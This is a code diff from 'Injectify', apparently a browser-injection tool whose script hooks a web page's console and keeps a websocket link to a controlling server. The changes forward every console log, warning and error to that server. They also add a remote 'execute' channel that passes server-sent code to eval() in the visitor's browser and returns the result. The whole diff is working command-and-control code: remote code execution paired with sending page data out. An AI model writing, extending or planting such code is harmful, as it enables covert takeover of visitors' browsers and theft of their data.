@@ -91,45 +91,39 @@ window['injectify'] = class Injectify {
 				d: data,
 			}))
 		} catch(e) {
-			if (this.debug) console.error(e)
+			this.error(e.stack)
 		}
 	}
+
 	/**
 	 * Log data to websocket connection (and locally)
 	 * @param {(Object|string)} message Data to be logged
-	 * @param {boolean} local Whether to log it in the local console
 	 */
-	static log(message: any, local?: boolean) {
-		this.send('l', {
+	static log(message: any) {
+		injectify.send('l', {
 			type: 'info',
-			message: message
+			message: Array.prototype.slice.call(arguments)
 		})
-		if (local) console.log(message)
 	}
-	/**
-	 * Log data to websocket connection (and locally)
-	 * @param {(Object|string)} message Data to be logged
-	 * @param {boolean} local Whether to log it in the local console
-	 */
-	static error(message: any, local?: boolean) {
-		this.send('l', {
+	static error(message: any) {
+		injectify.send('l', {
 			type: 'error',
-			message: message
+			message: Array.prototype.slice.call(arguments)
 		})
-		if (local) console.error(message)
 	}
-	/**
-	 * Log data to websocket connection (and locally)
-	 * @param {(Object|string)} message Data to be logged
-	 * @param {boolean} local Whether to log it in the local console
-	 */
-	static warn(message: any, local?: boolean) {
-		this.send('l', {
+	static warn(message: any) {
+		injectify.send('l', {
 			type: 'warn',
+			message: Array.prototype.slice.call(arguments)
+		})
+	}
+	static return(message: any) {
+		injectify.send('l', {
+			type: 'return',
 			message: message
 		})
-		if (local) console.warn(message)
 	}
+
 	/**
 	 * Get the websocket ping time (in milliseconds)
 	 * @param {function} callback Callback to be executed on ping complete
@@ -348,32 +342,27 @@ window['injectify'] = class Injectify {
 	static console(state: boolean) {
 		if (!state && console['hooked']) {
 				console['unhook']()
+				return 'unhooked'
 		} else if (!console['hooked']) {
 			((Console) => {
 				// @ts-ignore
-				console = {
+				window['console'] = {
 					...Console,
 					Console: Console,
 					log() {
 						Console.log.apply(this, arguments)
-						Array.prototype.slice.call(arguments).forEach(msg => {
-							injectify.log(msg)
-						})
+						injectify.log.apply(this, arguments)
 					},
 					info() {
 						this.log.apply(this, arguments)
 					},
 					warn() {
 						Console.warn.apply(this, arguments)
-						Array.prototype.slice.call(arguments).forEach(msg => {
-							injectify.warn(msg)
-						})
+						injectify.warn.apply(this, arguments)
 					},
 					error() {
 						Console.error.apply(this, arguments)
-						Array.prototype.slice.call(arguments).forEach(msg => {
-							injectify.error(msg)
-						})
+						injectify.error.apply(this, arguments)
 					},
 					unhook() {
 						console = Console
@@ -381,6 +370,7 @@ window['injectify'] = class Injectify {
 					hooked: true
 				}
 			})(console)
+			return 'hooked'
 		}
 	}
 }
@@ -465,7 +455,10 @@ injectify.listener((data, topic) => {
 				console.error('📦 ' + data.error.message, module)
 			}
 		}
-		if (topic == 'execute' || topic == 'core') {
+		if (topic == 'execute') {
+			injectify.return(eval(data))
+		}
+		if (topic === 'core') {
 			eval(data)
 		}
 	} catch(e) {
